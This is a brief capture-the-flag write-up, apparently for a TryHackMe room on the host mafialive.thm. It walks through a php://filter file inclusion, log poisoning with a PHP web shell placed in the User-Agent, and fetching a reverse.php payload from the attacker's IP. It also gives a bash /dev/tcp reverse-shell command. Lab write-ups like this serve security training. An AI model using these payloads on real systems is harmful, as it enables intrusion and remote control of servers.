Domain is mafialive.thm

http://mafialive.thm/robots.txt

robots.txt:
```
Disallow: /test.php
```
# Lfi

Finally, something interesting

So, we need to read the code of test.php, so we put this string in url (php filter): 
```
mafialive.thm/test.php?view=php://filter/convert.base64-encode/resource=/var/www/html/development_testing/test.php
```

And we have file test.php

# Poison

Change user-agent: 
<?php system($_GET['cmd']); ?>

view=/var/www/html/development_testing/..//..//..//..//..//var/log/apache2/access.log&cmd=ls

Poisoning:

```bash
python -m SimpleHTTPServer 8000
```

Then: view=/var/www/html/development_testing/..//..//..//..//..//var/log/apache2/access.log&cmd=wget http://10.4.32.95:8000/reverse.php
&cmd=php%20reverse.php

```bash
bash -i >& /dev/tcp/10.4.32.95/4444 0>&1
```

https://devskynet.netlify.app/post/tryhackme-archangel/